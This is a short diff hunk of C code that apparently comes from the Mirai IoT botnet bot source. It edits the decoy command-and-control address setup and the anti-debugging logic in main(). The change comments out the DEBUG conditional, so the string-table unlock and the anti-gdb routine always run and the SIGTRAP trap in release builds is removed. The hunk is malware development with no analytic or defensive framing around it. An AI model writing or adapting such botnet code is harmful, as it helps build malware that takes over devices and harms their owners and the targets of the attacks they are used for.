@@ -106,13 +106,13 @@ int main(int argc, char **args)
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
     srv_addr.sin_port = htons(FAKE_CNC_PORT);
 
-#ifdef DEBUG
+//#ifdef DEBUG
     unlock_tbl_if_nodebug(args[0]);
     anti_gdb_entry(0);
-#else
-    if (unlock_tbl_if_nodebug(args[0]))
-        raise(SIGTRAP);
-#endif
+//#else
+//    if (unlock_tbl_if_nodebug(args[0]))
+//        raise(SIGTRAP);
+//#endif
 
     ensure_single_instance();
 
